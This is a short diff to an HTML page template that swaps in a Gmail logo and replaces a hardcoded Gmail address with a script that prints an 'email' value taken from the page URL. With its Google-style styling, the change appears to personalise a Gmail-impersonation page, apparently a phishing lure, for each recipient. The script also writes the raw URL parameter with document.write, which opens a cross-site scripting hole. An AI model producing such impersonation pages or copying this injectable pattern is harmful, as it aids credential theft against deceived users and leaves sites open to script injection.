@@ -172,7 +172,7 @@
 <div class="bee-row-content">
 <div class="bee-col bee-col-1 bee-col-w12">
 <div class="bee-block bee-block-1 bee-image">
-<img alt="" class="bee-center bee-fixedwidth" src="logo.png" style="max-width:83px;"/>
+<img alt="" class="bee-center bee-fixedwidth" src="gmail.png" style="max-width:83px;"/>
 </div>
 <div class="bee-block bee-block-2 bee-heading">
 <h1 style="color:#202124;direction:ltr;font-family:Roboto, Tahoma, Verdana, Segoe, sans-serif;font-size:23px;font-weight:normal;letter-spacing:normal;line-height:200%;text-align:center;">
@@ -185,7 +185,12 @@
 <div class="bee-button-content" style="font-size: 12px; line-height: 18px; background-color: transparent; border-bottom: 1px solid #DADCE0; border-left: 1px solid #DADCE0; border-radius: 50px; border-right: 1px solid #DADCE0; border-top: 1px solid #DADCE0; color: #3c4043; font-family: inherit; max-width: 100%; padding-bottom: 5px; padding-left: 20px; padding-right: 20px; padding-top: 5px; width: auto; display: inline-block;">
 <span style="font-size: 16px; line-height: 150%; word-break: break-word;">
 <span style="font-size: 14px; line-height: 21px;">
-          bethtrindade57@gmail.com
+          <script>
+          	const queryString = window.location.search;
+				const urlParams = new URLSearchParams(queryString);
+				const email = urlParams.get('email')
+				document.write(email)
+			 </script>
          </span>
 </span>
 </div>
